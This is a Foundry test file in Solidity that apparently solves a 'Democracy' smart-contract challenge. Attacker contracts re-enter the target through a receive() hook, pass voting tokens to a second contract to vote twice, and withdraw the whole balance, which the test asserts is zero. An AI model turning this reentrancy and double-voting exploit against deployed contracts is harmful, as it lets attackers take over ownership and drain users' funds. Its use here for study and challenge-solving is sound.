// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {Democracy} from "../src/Democracy.sol";

pragma solidity ^0.8.0;

contract DemocracyTest is Test {
    Democracy democracy;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        hoax(victim, 10 ether);
        democracy = new Democracy{value: 1 ether}();
        vm.deal(attacker, 1 ether);
    }

    function testDemocracy() public {
        console.log("First owner", democracy.owner());
        vm.prank(attacker);
        DemocracyHack democracyHack = new DemocracyHack(democracy);
        democracyHack.execute();
        console.log("Second owner", democracy.owner());
        assertEq(address(democracy).balance, 0);
    }
}

contract DemocracyHack {
    address public owner;
    Democracy public democracy;
    DemocracyHack2 public democracyHack2;

    constructor(Democracy _democracy) payable {
        owner = msg.sender;
        democracy = _democracy;
    }

    function execute() public {
        democracy.nominateChallenger(address(this));
        democracy.vote(address(this));
    }

    receive() external payable {
        democracyHack2 = new DemocracyHack2(democracy);
        democracy.safeTransferFrom(address(this), address(democracyHack2), 0, "");
        democracy.safeTransferFrom(address(this), address(democracyHack2), 1, "");
        democracyHack2.vote();
        democracy.withdrawToAddress(owner);
    }
}

contract DemocracyHack2 {
    Democracy public democracy;

    constructor(Democracy _democracy) {
        democracy = _democracy;
    }

    function vote() public {
        democracy.vote(msg.sender);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable {}
}
